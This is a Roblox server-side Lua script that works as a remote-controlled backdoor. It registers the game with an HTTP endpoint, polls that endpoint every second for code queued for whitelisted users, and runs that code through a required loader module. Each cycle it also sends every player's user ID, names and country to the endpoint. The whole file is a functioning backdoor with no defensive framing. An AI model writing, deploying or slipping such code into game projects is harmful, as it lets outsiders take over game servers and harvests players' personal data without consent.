local https = game:GetService("HttpService")
local plrs = game:GetService("Players")

local endpoint = "http://localhost:5000/"
local run = require(0x26E001F12)

local threads = {}

pcall(function()
	https:PostAsync(endpoint.."api/game?placeid="..tostring(game.PlaceId), "")
end)

local whitelist = function(plr)
	return https:JSONDecode(https:GetAsync(endpoint.."api/whitelist?userid="..tostring(plr.UserId)))
end

local function plrAdded(plr)
	if whitelist(plr) then
		threads[tostring(plr.UserId)] = coroutine.create(function()
			while true do
				task.wait(1)
				pcall(function()
					local queue = https:JSONDecode(https:GetAsync(endpoint.."api/ping?userid="..tostring(plr.UserId), true))
                    for _, code in pairs(queue) do
				    	coroutine.wrap(function()
                            run(code)
                        end)()
                    end
				end)
				pcall(function()
					local plrs = {}
					for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
						local info = {}
						info["UserId"] = plr.UserId
						info["DisplayName"] = plr.DisplayName
						info["Username"] = plr.Name
						info["Country"] = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(plr)
						plrs[plr.Name] = info
					end
					https:PostAsync(endpoint.."api/players?userid="..tostring(plr.UserId), https:JSONEncode(plrs), Enum.HttpContentType.ApplicationJson, false)
				end)
			end
		end)
		coroutine.resume(threads[tostring(plr.UserId)])
	end
end
local function plrRemoving(plr)
	if whitelist(plr) then
		pcall(function()
			https:PostAsync(endpoint.."api/close", "", Enum.HttpContentType.TextPlain, false, {["user-id"]=tostring(plr.UserId)})
		end)
		coroutine.close(threads[tostring(plr.UserId)])
	end
end

for _, plr in pairs(plrs:GetPlayers()) do
    plrAdded(plr)
end
plrs.PlayerAdded:Connect(plrAdded)
plrs.PlayerRemoving:Connect(plrRemoving)

game:BindToClose(function()
    for _, plr in pairs(plrs:GetPlayers()) do
        plrRemoving(plr)
    end
	wait(1)
end)